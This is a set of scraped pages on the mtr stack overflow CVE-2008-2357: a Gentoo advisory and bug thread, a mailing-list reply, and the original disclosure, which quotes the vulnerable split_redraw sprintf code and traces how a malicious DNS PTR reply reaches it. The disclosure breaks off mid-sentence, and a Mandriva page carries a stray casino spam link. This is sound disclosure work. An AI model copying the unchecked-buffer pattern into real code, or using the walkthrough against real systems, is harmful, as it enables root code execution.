=== Content from security.gentoo.org_7d1bf321_20250125_104743.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# mtr: Stack-based buffer overflow — GLSA **200806-01**

A stack-based buffer overflow was found in mtr, possibly resulting in the
execution of arbitrary code.

### Affected packages

| Package | **net-analyzer/mtr** on all architectures |
| --- | --- |
| Affected versions | < **0.73-r1** |
| Unaffected versions | >= **0.73-r1** |

### Background

mtr combines the functionality of the 'traceroute' and 'ping' programs
in a single network diagnostic tool.

### Description

Adam Zabrocki reported a boundary error within the split\_redraw()
function in the file split.c, possibly leading to a stack-based buffer
overflow.

### Impact

A remote attacker could use a specially crafted resolved hostname to
execute arbitrary code with root privileges. However, it is required
that the attacker controls the DNS server used by the victim, and that
the "-p" (or "--split") command line option is used.

### Workaround

There is no known workaround at this time.

### Resolution

All mtr users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=net-analyzer/mtr-0.73-r1"
```
### References

* [CVE-2008-2357](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2357)

**Release date**

June 03, 2008

**Latest revision**

June 03, 2008: 01

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [223017](https://bugs.gentoo.org/show_bug.cgi?id=223017)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from www.openwall.com_c9fdf73c_20250125_104747.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](3) [[next>]](5) [[<thread-prev]](3) [[thread-next>]](5) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <48338E45.8000804@freethemallocs.com>
Date: Tue, 20 May 2008 18:51:49 -0800
From: Jonathan Smith <smithj@...ethemallocs.com>
To: oss-security@...ts.openwall.com
Subject: Re: CVE request: mtr

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

security curmudgeon wrote:
| I did a quick once over on the site and did not see anything in the news,
| bug system or changelog (dated 2004 i think) in the archive.

The changelog threw me as well. It seems recent changes are contained in
the NEWS file. It did not, however, mention this issue, or anything else
that may have been fixed in 0.73.

	smithj

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.9 (GNU/Linux)

iEYEARECAAYFAkgzjkUACgkQCG91qXPaRelH2wCfXkGRuwSImXC1KMBaVFzs7oVm
LuwAoItrvaEe7VtfR5jMOAA87ROL4LYC
=E5qZ
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from securityreason.com_e26a0cfe_20250125_104744.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from bugs.gentoo.org_29c98607_20250126_080526.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Bug 223017
net-analyzer/mtr <0.73-r2 Stack-based buffer overflow (CVE-2008-2357)
Last modified: 2020-04-09 06:40:14 UTC node [vulture]

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=223017&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=223017&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 223017**](show_bug.cgi?id=223017)
(CVE-2008-2357)
- net-analyzer/mtr <0.73-r2 Stack-based buffer overflow (CVE-2008-2357)

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
net-analyzer/mtr <0.73-r2 Stack-based buffer overflow (CVE-2008-2357)

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2008-2357 | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Gentoo Security | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Gentoo Security "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Vulnerabilities ([show other bugs](buglist.cgi?component=Vulnerabilities&product=Gentoo%20Security&bug_status=__open__)) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | High major | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Gentoo Security | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") | [http://seclists.org/fulldisclosure/20...](http://seclists.org/fulldisclosure/2008/May/0488.html) | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") | C1 [glsa] | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [296413](show_bug.cgi?id=296413 "RESOLVED FIXED - net-analyzer/mtr-0.75 unabe to run as normal user") | |  | Show dependency [tree](showdependencytree.cgi?id=223017&hide_resolved=1) | |  | | Reported: | 2008-05-21 02:01 UTC by Robert Buchholz (RETIRED) | | --- | --- | | Modified: | 2020-04-09 06:40 UTC ([History](show_activity.cgi?id=223017)) | | CC List: | 2 users (show)  netmon ole+gentoo | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Package list:](page.cgi?id=fields.html#cf_stabilisation_atoms "Contains a list of packages (and optionally, architectures) to keyword or stabilize. One fully qualified package per line, optionally followed by a space-delimited list of architectures for that package.") |  | | [Runtime testing required:](page.cgi?id=fields.html#cf_runtime_testing_required "Indicate what level of testing is required. For manual testing following instructions in the bug, choose \"Manual\". For only compile-testing, choose \"No\". For where tests must pass, choose \"Yes\".") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | | --- | --- | --- | | [**mtr-0.73-remove-sprintf.patch**](attachment.cgi?id=153971 "View the content of the attachment") (mtr-0.73-remove-sprintf.patch,9.02 KB, patch)  [2008-05-22 18:53 UTC](#attach_153971 "Go to the comment associated with the attachment"), Robert Buchholz (RETIRED) | *no flags* | [Details](attachment.cgi?id=153971&action=edit) | [Diff](attachment.cgi?id=153971&action=diff) | | [View All](attachment.cgi?bugid=223017&action=viewall)  [Add an attachment](attachment.cgi?bugid=223017&action=enter) (proposed patch, testcase, etc.) | | |   | Note You need to [log in](show_bug.cgi?id=223017&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](#c0)  Robert Buchholz (RETIRED)   gentoo-dev  2008-05-21 02:01:39 UTC  ``` Quoting Adam Zabrocki: It is possible to overflow buffor on stack in suid program - mtr. Remote attack is possible too. Bug is in function which print result of runing program with parametr 'split' (-p). Victim must use DNS which we can control or we can try exploit this vulnerability by spoofing technique. In remote exploiting this vulnerability we must know which IP user gave to program - or he must simply run program and argument must be IP adres which we can controle in DNS server. ```  [Comment 1](#c1)  Robert Buchholz (RETIRED)   gentoo-dev  2008-05-21 02:03:25 UTC  ``` We install the program with following privileges: # ls -la /usr/bin/mtr -rws--x--- 1 root wheel 75328 21. Mai 03:59 /usr/bin/mtr  ```  [Comment 2](#c2)  Robert Buchholz (RETIRED)   gentoo-dev  2008-05-22 18:41:34 UTC  ``` CVE-2008-2357: Stack-based buffer overflow in the split_redraw function in split.c in mtr before 0.73, when invoked with the -p (aka --split) option, allows remote attackers to execute arbitrary code via a crafted DNS PTR record.  NOTE: it could be argued that this is a vulnerability in the ns_name_ntop function in resolv/ns_name.c in glibc and the proper fix should be in glibc; if so, then this should not be treated as a vulnerability in mtr.  ```  [Comment 3](#c3)  Robert Buchholz (RETIRED)   gentoo-dev  2008-05-22 18:52:33 UTC  ``` This issue is fixed in mtr 0.73. Still, a lot of sprintf's are used in the code. For the future, it should be worthwhile to get this patch in there and upstream: [http://cvs.fedoraproject.org/viewcvs/*checkout*/rpms/mtr/F-7/mtr-0.69-CVE-2002-0497.patch?rev=1.1](http://cvs.fedoraproject.org/viewcvs/%2Acheckout%2A/rpms/mtr/F-7/mtr-0.69-CVE-2002-0497.patch?rev=1.1)   ```  [Comment 4](#c4)  Robert Buchholz (RETIRED)   gentoo-dev  2008-05-22 18:53:54 UTC  ``` Created [attachment 153971](attachment.cgi?id=153971 "mtr-0.73-remove-sprintf.patch") [[details](attachment.cgi?id=153971&action=edit "mtr-0.73-remove-sprintf.patch"), [diff](attachment.cgi?id=153971&action=diff "mtr-0.73-remove-sprintf.patch")] mtr-0.73-remove-sprintf.patch  Removed the hunk that is included in the release, and refreshed. ```  [Comment 5](#c5)  Peter Volkov (RETIRED)   gentoo-dev  2008-05-24 15:37:40 UTC  ``` patch added in mtr-0.73-r1.ebuild. Thank you Robert for bug/patch digging! ```  [Comment 6](#c6)  Robert Buchholz (RETIRED)   gentoo-dev  2008-05-24 15:59:11 UTC  ``` Arches, please test and mark stable: =net-analyzer/mtr-0.73-r1 Target keywords : "alpha amd64 arm hppa ia64 ppc release s390 sh sparc x86"  ```  [Comment 7](#c7)  Jeroen Roovers (RETIRED)   gentoo-dev  2008-05-24 16:47:56 UTC  ``` I'm having fetch problems here for gtk-2.0-for-mtr.m4.bz2. On top of that, the Manifest doesn't agree with the /space/distfiles-local version. The file doesn't seem to have hit mirrors yet, perhaps because of the Manifest problem. ```  [Comment 8](#c8)  Peter Volkov (RETIRED)   gentoo-dev  2008-05-24 17:34:11 UTC  ``` <http://sources.gentoo.org/viewcvs.py/gentoo-x86/net-analyzer/mtr/Manifest?rev=1.96&view=markup>  DIST gtk-2.0-for-mtr.m4.bz2 2508  RMD160 f5fc7a3a3c4fcfe03356170371113a1b0f18eda6 SHA1 c72993fdb224ffba6afeca43a60303ed0350c56f SHA256 59152f9a4a1af5cf09f2aaa804c9071afe3eb6632162f1660d85c820db342eba  pva@woodpecker ~ $ gpg --print-mds /space/distfiles-local/gtk-2.0-for-mtr.m4.bz2 | egrep 'SHA1|RMD160|SHA256'   SHA1 = C729 93FD B224 FFBA 6AFE  CA43 A603 03ED 0350 C56F RMD160 = F5FC 7A3A 3C4F CFE0 3356  1703 7111 3A1B 0F18 EDA6 SHA256 = 59152F9A 4A1AF5CF 09F2AAA8 04C9071A FE3EB663 2162F166 0D85C820 DB342EBA  They are equal as I see... Thus strange. Does anybody else have fetch problem? ```  [Comment 9](#c9)  Cédric Krier   gentoo-dev  2008-05-24 17:38:18 UTC  ``` No problems here. ```  [Comment 10](#c10)  Markus Meier   gentoo-dev  2008-05-25 11:01:22 UTC  ``` chown: cannot access `/var/tmp/portage/net-analyzer/mtr-0.73-r1/image//usr/bin/mtr': No such file or directory chmod: cannot access `/var/tmp/portage/net-analyzer/mtr-0.73-r1/image//usr/bin/mtr': No such file or directory >>> Completed installing mtr-0.73-r1 into /var/tmp/portage/net-analyzer/mtr-0.73-r1/image/  the binary is located in /usr/sbin/mtr. ```  [Comment 11](#c11)  Peter Volkov (RETIRED)   gentoo-dev  2008-05-25 11:54:11 UTC  ``` Markus as always attentive. Thank you, fixed in 0.73-r2. ```  [Comment 12](#c12)  Markus Meier   gentoo-dev  2008-05-25 13:21:30 UTC  ``` (In reply to [comment #11](show_bug.cgi?id=223017#c11)) > Markus as always attentive. Thank you, fixed in 0.73-r2.  thanks :) btw adding ``|| die'' for such things can also be useful...  amd64/x86 stable ```  [Comment 13](#c13)  Raúl Porcel (RETIRED)   gentoo-dev  2008-05-25 15:53:39 UTC  ``` alpha/ia64/sparc stable ```  [Comment 14](#c14)  Jeroen Roovers (RETIRED)   gentoo-dev  2008-05-25 16:44:59 UTC  ``` I was probably trying to fetch it too early. It's fine now.  Stable for HPPA. ```  [Comment 15](#c15)  Tobias Scherbaum (RETIRED)   gentoo-dev  2008-05-26 18:27:57 UTC  ``` ppc stable ```  [Comment 16](#c16)  Tobias Heinlein (RETIRED)   gentoo-dev  2008-05-26 19:29:23 UTC  ``` GLSA request filed. ```  [Comment 17](#c17)  REMOVED ACCOUNT    2008-05-26 23:14:52 UTC  ``` (In reply to [comment #10](show_bug.cgi?id=223017#c10)) > the binary is located in /usr/sbin/mtr.  Only because the code to put it into /usr/bin was removed in 0.73-r1 for some mysterious reason. Worse, it's not even executable by wheel users anymore. (/usr/bin was intentional, see #6521). ```  [Comment 18](#c18)  Peter Volkov (RETIRED)   gentoo-dev  2008-05-27 08:19:47 UTC  ``` (In reply to [comment #17](show_bug.cgi?id=223017#c17)) > Only because the code to put it into /usr/bin was removed in 0.73-r1 for some > mysterious reason. Worse, it's not even executable by wheel users anymore. > (/usr/bin was intentional, see #6521).  Wheel group is 'su -' allowed group. How it's related to networking stuff? Speaking about path, I suppose it was set at times mtr had o+rx permissions. Now it better fits /usr/sbin as ordinary users are not allowed to run this binary while users in wheel or root group should have sbin binaries in PATH (and that's what upstream has in mind, btw) as they are administrators and should either use that binaries or use full path!  That said, after reading SECURITY file in distribution, may be we could revert back mode to 4711, to allow ordinary users run this binary? But...  The problem here is a bit broader than mtr package... It's about how should we allow ordinary users to run networking applications which require root privileges to run. Should we create per package group and allow only users in that groups to run binaries with user ID execution bit set? Should we use wheel group for this (I'd better not)? Or may be we should allow ordinary users run such applications in case upstream supported that by dropping privileges (like in case of mtr)? Any suggestions from security team are more than welcome. ```  [Comment 19](#c19)  Peter Volkov (RETIRED)   gentoo-dev  2008-05-28 12:17:46 UTC  ``` Fixed in release snapshot. ```  [Comment 20](#c20)  Tobias Heinlein (RETIRED)   gentoo-dev  2008-06-08 20:52:30 UTC  ``` GLSA 200806-01 ```  [Comment 21](#c21)  Robert Buchholz (RETIRED)   gentoo-dev  2008-06-10 18:57:51 UTC  ``` Vaclav, /usr/sbin really is the best place for executables that have restricted execution access. This is unarguably the case for root, and I would argue also for wheel users.  Peter, do you know exactly why one would not have a user execute MTR? What more than ping/traceroute can it do? About your point in privileged groups for network monitoring, I would agree to have a system group for this. While monitoring a network on a machine usually correlates to root access to the machine, wheel is not the right group for this. This is better discussed in a new bug or on the netmon group, and it would best be accompanied by documentation like a network management guide. ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=223017)
* - [XML](show_bug.cgi?ctype=xml&id=223017)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=223017)
* - [Clone In The Same
  Product](enter_bug.cgi?cloned_bug_id=223017&product=Gentoo%20Security)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=223017&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=223017&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from www.mandriva.com_d003049e_20250125_104747.html ===


* [Tuxedo.org](https://tuxedo.org/ "Go to: Tuxedo")
* Store
* Mandriva Linux
* Enterprise Solutions
* Contact Us
* Language ![](/sites/all/themes/mandriva_customer/images/arrow-grey-bottom.gif)
  + English (International)
  + Français
  + Ð ÑÑÑÐºÐ¸Ð¹

# [Mandriva](/mandriva/)

* Download
* Mandriva Linux
* Community
* Help

## One

### The Linux desktopthat's easy to try and easy to keep

Download
![Mandriva One](/sites/all/themes/mandriva_customer/images/front/packshot_Mandriva_One.png)

## Powerpack

### Mandriva Linux- and more

Download
![Mandriva Linux Powerpack](/sites/all/themes/mandriva_customer/images/front/en-49.png)

## Mandriva Flash

### The mobile and installable Linux desktopon a USB key

Buy on Store
![Mandriva Flash](/sites/all/themes/mandriva_customer/images/front/mandriva-flash2.png)

### [Community](community)

* User Forums
* Support - FAQ
* Free Software
* Become a member

### Enterprise Solutions

* Enterprise Linux Products
* Asset Management Solution
* Professional Services
* Support & Maintenance

* Go to site »

### Mandriva Partners

* Worldwide offices
* Partner Program
* Technology Partners
* OEM
* Classmate PC with Mandriva Linux

### News

* Mandriva presents the launch of its new mobile desktop: Mandriva Flash 2008 Spring
* Speaking about Mandriva Linux 2008 Spring in media
* Speaking about Mandriva Linux 2008 Spring in media
* Mandriva presents its latest distribution: Mandriva Linux 2008 Spring
* Mandriva and Novatice Technologies present Edutice, The ready to use solution dedicated to educationand multimedia spaces
* # [Top 50 Online Casinos UK in 2023](https://montycasinos.com/online-casinos/)

more

* Download
  + Mandriva Linux 2008
  + Writing an ISO image
* Mandriva Linux
  + One
  + Powerpack
  + Mandriva Flash
* Community
  + Start
  + Register
  + Stay informed
  + Participate
  + Free software
* Help
  + Getting help
  + Knowledge Base
  + Documentation
  + Forums
  + Support Requests
  + Customer Care
  + Enterprise Support
* Enterprise Solutions
  + Products
  + Support
  + Services
  + Partners
  + Go to site »

Language
English (International)
Français
Ð ÑÑÑÐºÐ¸Ð¹

* © 2007 Mandriva S.A.
* About Us
* Legal Information
* Privacy Policy
* Contact Us



=== Content from seclists.org_1c9073f9_20250125_104741.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](487)
[By Date](date.html#488)
[![Next](/images/right-icon-16x16.png)](489)

[![Previous](/images/left-icon-16x16.png)](481)
[By Thread](index.html#488)
[![Next](/images/right-icon-16x16.png)](489)

![](/shared/images/nst-icons.svg#search)

# Mtr - remote and local stack overflow - uncomment situation in libresolv.

---

*From*: pi3 () itsec pl (Adam Zabrocki)

*Date*: Mon, 19 May 2008 23:13:28 +0200

---

```
Name:                      Mtr - network diagnostic tool.
Author:                    Adam Zabrocki <pi3 () itsec pl> or <pi3ki31ny () gmail com>
Date:                      February 28, 2008

   Issue:

Mtr allows local and remote attackers to overflow buffer on stack.

   Description:

Mtr combines the functionality of the traceroute and ping programs in a single
network diagnostic tool. For more detail please read manual page.

   Details:

It is possible to overflow buffor on stack in suid program - mtr. Remote attack
is possible too. Bug is in function which print result of runing program with parametr
'split' (-p). Victim must use DNS which we can control or we can try exploit this
vulnerability by spoofing technique. In remote exploiting this vulnerability we must
know which IP user gave to program - or he must simply run program and argument
must be IP adres which we can controle in DNS server.

Look for this code:

"split.c"
#define MAX_LINE_SIZE  256

void split_redraw(void)
{
  int   max;
  int   at;
  ip_t *addr;
  char *name;
  char  newLine[MAX_LINE_SIZE];
  int   i;

  ...

  for(at = 0; at < max; at++) {
    addr = net_addr(at);

    if( addrcmp( (void *) addr, (void *) &unspec_addr, af ) != 0 ) {
      name = dns_lookup(addr);                            [1]
      if(name != NULL) {
        /* May be we should test name's length */         [!!]
        sprintf(newLine, "%s %d %d %d %d %d %d", name,    [2]
                net_loss(at),
                net_returned(at), net_xmit(at),
                net_best(at) /1000, net_avg(at)/1000,
                net_worst(at)/1000);
      } else {
        ...
      sprintf(newLine, "???");
    }

    ...
    ...
  }
}

As we can see in [2] there is unsecure call for function sprintf().
Argument 'name' is RevDNS for IP address. In details exploiting this
situaction will be later becouse normal we can't do that!

Now let's look what call this function:

"display.c"
void display_redraw(void)
{
  switch(DisplayMode) {

  ...
  case DisplaySplit:            /* BL */
    split_redraw();
    break;
  ...
  }
}

Call for function display_redraw() is here:
"select.c"
void select_loop(void) {

  ...
  ...

  while(1) {

    ...
    ...

    do {
      if(anyset || paused) {
        ...
      } else {
        if(Interactive) display_redraw();

        ...
        ...
      }
    } while ((rv < 0) && (errno == EINTR));

    ...
    ...

  }
  return;
}

And call for this functio is here:

"display.c"
void display_loop(void)
{
  switch(DisplayMode) {
  case DisplayReport:
  case DisplayTXT:
  case DisplayXML:
  case DisplayCSV:
  case DisplaySplit:            /* BL */
  case DisplayCurses:
  case DisplayRaw:
    select_loop();
    break;
  case DisplayGTK:
    gtk_loop();
    break;
  }
}

Call for function display_loop() is in main function:

"mtr.c"
int main(int argc, char **argv)
{
  ...
  ...

  display_loop();

  ...

  return 0;
}

Value for variable 'Interactive' is here:

"mtr.c"
int   Interactive = 1;

void parse_arg (int argc, char **argv)
{
  ...
  ...

  while(1) {
    /* added f:m:o: byMin */
    opt = getopt_long(argc, argv,
                      "vhrxtglpo:i:c:s:b:Q:na:f:m:46", long_options, NULL);
    if(opt == -1)
      break;

    switch(opt) {

    ...

    case 'p':                 /* BL */
      DisplayMode = DisplaySplit;
      break;

    ...

  }

  if (DisplayMode == DisplayReport ||
      DisplayMode == DisplayTXT ||
      DisplayMode == DisplayXML ||
      DisplayMode == DisplayRaw ||
      DisplayMode == DisplayCSV)
    Interactive = 0;

  ...
}

So we must run program with option '-p' to be in function split_redraw().

Ok it is the first topic of this advisory. Let's look how to exploit it.
In place [1] we can saw this line:

      name = dns_lookup(addr);                            [1]

so we must look how we can controle value of this variable. Look here:

"dns.c"
char *dns_lookup(ip_t * ip)
{
  char *t;

  if (!dns) return strlongip (ip);
  t = dns_lookup2 (ip);
  return (t&&use_dns)?t:strlongip(ip);
}

and function dns_lookup2() is here:
"dns.c"
char *dns_lookup2(ip_t * ip)
{
  struct resolve *rp;

  if ((rp = findip(ip))) {
    ...
    <try to find this IP in local cache which mtr create>
    ...
  }
  rp = allocresolve();
  rp->state = STATE_PTRREQ1;
  rp->expiretime = sweeptime + ResRetryDelay1;
  addrcpy( (void *) &(rp->ip), (void *) ip, af );
  linkresolve(rp);
  addrcpy( (void *) &(rp->ip), (void *) ip, af );
  linkresolveip(rp);
  sendrequest(rp,T_PTR);
  return NULL;
}

funkction linkresolve/linkresolveip initialize data for new data (address/domain)
and once again try to find this in cache. So let's look for function sendrequest():

"dns.c"
void sendrequest(struct resolve *rp,int type)
{
  do {
    idseed = (((idseed + idseed) | (long)time(NULL)) + idseed - 0x54bad4a) ^ aseed;
    aseed^= idseed;
    rp->id = (word)idseed;
  } while (findid(rp->id));
  linkresolveid(rp);
  resendrequest(rp,type);
}

linkresolveid() try to find this id in cache :) So look for resendrequest():

"dns.c"
void resendrequest(struct resolve *rp,int type)
{
  if (type == T_A) {
    ...
    ...
  } else if (type == T_PTR) {
    switch ( af ) {
    case AF_INET:
    sprintf(tempstring,"%u.%u.%u.%u.in-addr.arpa",
            ((byte *)&rp->ip)[3],
            ((byte *)&rp->ip)[2],
            ((byte *)&rp->ip)[1],
            ((byte *)&rp->ip)[0]);
      break;
#ifdef ENABLE_IPV6
    case AF_INET6:
      addr2ip6arpa( &(rp->ip), tempstring );
      break;
#endif
    }
    dorequest(tempstring,type,rp->id);
    ...
    ...
  }
}

and function dorequest() make and send quero PTR for DNS server:

"dns.c"
void dorequest(char *s,int type,word id)
{
  packetheader *hp;
  int r,i;
  int buf[(MaxPacketsize/sizeof (int))+1];

  r = res_mkquery(QUERY,s,C_IN,type,NULL,0,NULL,(unsigned char*)buf,MaxPacketsize);
  if (r == -1) {
    restell("Resolver error: Query too large.");
    return;
  }
  hp = (packetheader *)buf;
  hp->id = id;  /* htons() deliberately left out (redundant) */
  for (i = 0;i < _res.nscount;i++)
    (void)sendto(resfd,buf,r,0,(struct sockaddr *)&_res.nsaddr_list[i],
                 sizeof(struct sockaddr));
}

... and reply from server is examined in select_loop() function:

"select.c"
void select_loop(void) {
  ...
  ...

  while(1) {

    ...

    if (dns) {
      /* Handle any pending resolver events */
      dnsinterval = WaitTime;
      dns_events(&dnsinterval);
    }

    /*  Have we finished a nameservice lookup?  */
    if(dns && FD_ISSET(dnsfd, &readfd)) {
      dns_ack();
      anyset = 1;
    }

   ...

  }
  ...
}

and function dns_ack() is here:

"dns.c"
void dns_ack(void)
{
  int r,i;

  r = recvfrom(resfd,(byte *)resrecvbuf,MaxPacketsize,0,
               from, &fromlen);
  if (r > 0) {
    ...
    <some tests>
    ...
    if (i == _res.nscount) {
      ...
    } else
      parserespacket((byte *)resrecvbuf,r);
  } else {
    ...
  }
}

So we must look for function parserespacket(). It's realy big
and advanced function so i paste only what we must see. Look:

"dns.c"
void parserespacket(byte *s, int l)
{
  ..,
  packetheader *hp;
  ...

  ...
  hp = (packetheader *)s;
  ...
  <many tests for packet/header>
  ...
  ...
  eob = s + l;
  c = s + HFIXEDSZ;
  switch (getheader_rcode(hp)) {
  case NOERROR:
    if (hp->ancount) {
      ...
      <many fine test etc>
      ...
      switch (qdatatype) {
      case T_PTR:
        if (!Is_PTR(rp))
          if (debug) {
            restell("Resolver warning: Ignoring response with unexpected query type \"PTR\".");
            return;
          }
        break;
      default:
        sprintf(tempstring,"Resolver error: Received unimplemented query type: %u (%s)",
                qdatatype,qdatatype < ResourcetypeCount ?
